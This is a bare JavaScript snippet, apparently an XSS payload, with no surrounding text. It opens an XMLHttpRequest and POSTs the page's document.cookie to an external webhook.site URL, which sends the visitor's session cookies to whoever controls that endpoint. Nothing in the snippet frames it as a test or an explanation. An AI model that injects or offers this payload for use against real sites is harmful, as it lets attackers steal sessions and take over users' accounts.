var xhr = new XMLHttpRequest();
xhr.open("POST", 'https://webhook.site/84ce494c-10af-4b37-a270-59dd899e4d1d', true);
xhr.setRequestHeader('Content-Type', 'text/html');
xhr.send(document.cookie);